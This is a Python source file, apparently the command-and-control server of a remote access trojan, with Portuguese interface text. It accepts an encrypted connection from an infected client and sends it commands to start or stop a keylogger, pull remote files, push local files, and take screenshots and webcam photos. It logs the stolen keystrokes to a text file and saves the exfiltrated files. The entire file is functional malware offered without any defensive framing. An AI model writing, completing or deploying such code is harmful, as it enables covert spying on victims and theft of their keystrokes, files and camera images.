import socket
from cryptography.fernet import Fernet
import threading
import sys, base64
import json, os

def recvData(sock):
	def decrypt(enc_data):
		fernet = Fernet(aeskey)
		data = fernet.decrypt(enc_data)

		return data

	while True:
		try:
			raw_data = sock.recv(1024)
		except OSError:
			exit(0)

		if raw_data:
			while True:
				try:
					data = json.loads(decrypt(raw_data).decode())
					break
				except:
					raw_data += sock.recv(1024)

			if "tecla" in data:
				with open("teclas.txt", "a") as f:
					f.write(data["tecla"] + "\n")

			elif "alerta" in data:
				msg = data["alerta"]
				print(f"\n[!] {msg}    \nComando > ", end="")

			elif "comando" in data:
				comando = data["comando"]
				print(f"\n{comando}    \nComando > ", end="")

			elif "download" in data:
				download = data["download"]
				for file in download:
					with open(file, "wb") as f:
						f.write(base64.b64decode(download[file]))

				print(f"\nArquivo [{file}] recebido com sucesso!\nComando > ", end="")

def encrypt(data):
	fernet = Fernet(aeskey)
	enc_data = fernet.encrypt(data.encode())

	return enc_data

def upload(file, sock):
	file = file[7:]

	try:
		filename = file.split("/")[-1]
	except:
		filename = file

	if os.path.isfile(file):
		with open(file, "rb") as f:
			data = base64.b64encode(f.read()).decode()

		packet = json.dumps({"download":{filename:data}})
		enc_packet = encrypt(packet)
		sock.sendall(enc_packet)
	else:
		print(f"Arquivo {file} não encontrado")

def sendData(sock):
	help = """
------------
start keylogger -> INICIAR KEYLOGGER
stop keylogger  -> PARAR KEYLOGGER
download <remote filename> -> BAIXAR ARQUIVO REMOTO
upload <local filename> -> ENVIA ARQUIVO LOCAL
screenshot -> CAPTURA UMA SCREENSHOT DA TELA
webcam -> CAPTURA UMA FOTO DA CAMERA
------------
"""
	while True:
		raw_data = input("Comando > ")
		key = "action"

		if raw_data == "start keylogger":
			raw_data = "sk1"
		elif raw_data == "stop keylogger":
			raw_data = "sk0"
		elif raw_data == "help":
			print (help)
			continue

		elif raw_data[:7] == "upload ":
			upload(raw_data, sock)
			continue

		packet = json.dumps({key:raw_data})
		sock.send(encrypt(packet))

		if raw_data == "exit":
			sock.close()
			exit(0)


def startS(port):
	global aeskey

	s = socket.socket()
	s.bind(("0.0.0.0", port))
	s.listen()

	print("Aguardando conexão")
	con, cliente = s.accept()
	print(f"Conexão recebida {cliente}")

	data = json.loads(con.recv(1024))
	aeskey = data["chave"]
	con.send("ok".encode())

	return con

port = int(sys.argv[1])
sock = startS(port)

recv = threading.Thread(target=recvData, args=(sock,))
send = threading.Thread(target=sendData, args=(sock,))

recv.start()
send.start()
